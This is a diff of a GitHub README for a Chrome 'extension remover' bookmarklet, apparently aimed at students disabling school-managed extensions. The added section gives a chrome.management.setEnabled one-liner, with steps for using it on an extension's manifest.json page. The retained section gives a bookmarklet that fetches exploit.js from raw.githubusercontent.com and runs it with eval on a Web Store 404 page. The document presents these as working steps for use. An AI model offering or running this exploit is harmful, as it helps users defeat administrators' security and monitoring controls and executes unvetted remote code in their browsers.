@@ -1,4 +1,4 @@
-# ext remover
+# Extension remover
 
 ## ATTENTION ALL SYS ADMINS!!! 
 
@@ -14,7 +14,25 @@ Bookmarklet exploit that can force-disable any extension installed on Google Chr
 
 If you need any help, please go here: https://github.com/3kh0/ext-remover/discussions
 
-## Instructions
+## For v106 and up
+
+![image](https://user-images.githubusercontent.com/58097612/207386423-e6aa2095-d92d-44a8-a3d6-e42066bdf34e.png)
+
+The screenshot below was preformed on 108.0.5359.75 (Official Build) (64-bit) on the stable channel.
+
+This has been tested and does work but has varying levels of success, you will need access bookmarklets (or inspect if your school is dumb like that) and access to a manifest.json page of a extension.
+
+Run the code below, replace the echoontop with the extension ID you want to disable.
+
+```js
+chrome.management.setEnabled('echoontop',!1)
+```
+
+![image](https://user-images.githubusercontent.com/58097612/207385046-5a9f6f07-6089-4775-9183-c11bd24ba02c.png)
+
+To re-enable just go to the chrome web listing for the extension and click on the banner.
+
+## For v106 and below
 
 Here are the instructions to using this exploit! There are two ways, using the GUI and using the ids, the GUI method is better.
 
@@ -44,7 +62,6 @@ Credit to CompactCow#4717 for the amazing UI!
 ```js
 javascript:fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
 ```
-
 
 3. Visit https://chrome.google.com/webstorex. (This is a 404 page, and that is ok.)
 4. Click the bookmark (Make sure you are on the page above!)
